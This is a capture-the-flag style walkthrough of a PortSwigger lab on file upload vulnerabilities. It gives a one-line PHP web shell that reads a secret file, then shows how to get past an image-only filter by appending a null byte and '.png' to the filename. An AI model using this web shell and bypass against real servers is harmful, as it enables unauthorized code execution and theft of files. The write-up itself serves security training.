# Web shell upload via obfuscated file extension

I went to my account and entered the provided credentials **username=wiener and password=peter**. And then I shown up a page where there was option to upload an image.

This is the point where we can upload our web shell to read the file **/home/carlos/secret**. 

Firstly, we need create the payload, that is:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

save it into a .php file and upload it but make sure you capture the request in burpsuite and sent it to the repeater in order to analyze the server behaviour.

Upload `webShell.php` file and you will get the response:

**Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.**

Now, I tried many techniques that are mentioned in portswigger learning material(link is in following):

[File Upload vulnerabilities](https://portswigger.net/web-security/file-upload#what-are-file-upload-vulnerabilities)

Finally I tried the obfuscation:

`webShell.php%00.png`

Boom! It has been uploaded sucessfully with the response: **The file avatars/webShell.php has been uploaded.**

It means that .php shell has been uploaded as we want.

Now make a request to trigger the shell at the path:`files/avatars/webShell.php`

Yes! We got the desired value to complete the lab.


